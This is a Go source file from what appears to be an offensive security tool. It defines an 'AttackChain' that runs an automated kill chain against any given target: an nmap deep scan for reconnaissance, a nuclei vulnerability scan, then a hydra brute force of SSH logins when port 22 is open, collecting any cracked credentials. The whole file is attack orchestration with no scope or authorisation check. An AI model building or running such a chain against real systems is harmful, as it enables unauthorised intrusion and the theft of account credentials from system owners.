package fusion

import (
	"fmt"
	"log"

	"github.com/fortress/v6/internal/config"
)

type AttackChain struct {
	nmap   *NmapScanner
	nuclei *NucleiScanner
	hydra  *HydraBruteForcer
}

type ChainResult struct {
	Target   string        `json:"target"`
	Scan     *ScanResult   `json:"scan"`
	Findings []VulnFinding `json:"findings"`
	Creds    []Credential  `json:"credentials"`
}

func NewAttackChain(cfg *config.WeaponsConfig) *AttackChain {
	return &AttackChain{
		nmap:   NewNmapScanner(cfg),
		nuclei: NewNucleiScanner(cfg),
		hydra:  NewHydraBruteForcer(cfg),
	}
}

// Execute runs the full kill chain: recon → vuln → exploit.
func (ac *AttackChain) Execute(target string) (*ChainResult, error) {
	result := &ChainResult{Target: target}

	// Phase 1: Recon (nmap deep scan)
	log.Printf("[fusion] Phase 1: recon %s", target)
	scan, err := ac.nmap.DeepScan(target)
	if err != nil {
		return result, fmt.Errorf("recon: %w", err)
	}
	result.Scan = scan
	log.Printf("[fusion] recon done: %d open ports", len(scan.Ports))

	// Phase 2: Vuln scan (nuclei)
	log.Printf("[fusion] Phase 2: vuln scan %s", target)
	findings, err := ac.nuclei.Scan(target)
	if err != nil {
		log.Printf("[fusion] vuln scan warning: %v", err)
	}
	result.Findings = findings
	log.Printf("[fusion] vuln scan done: %d findings", len(findings))

	// Phase 3: Brute force (hydra SSH if port 22 open)
	for _, p := range scan.Ports {
		if p.Port == 22 && p.State == "open" {
			log.Printf("[fusion] Phase 3: brute SSH on %s", target)
			creds, err := ac.hydra.BruteSSH(target)
			if err != nil {
				log.Printf("[fusion] brute warning: %v", err)
			}
			result.Creds = creds
		}
	}

	return result, nil
}
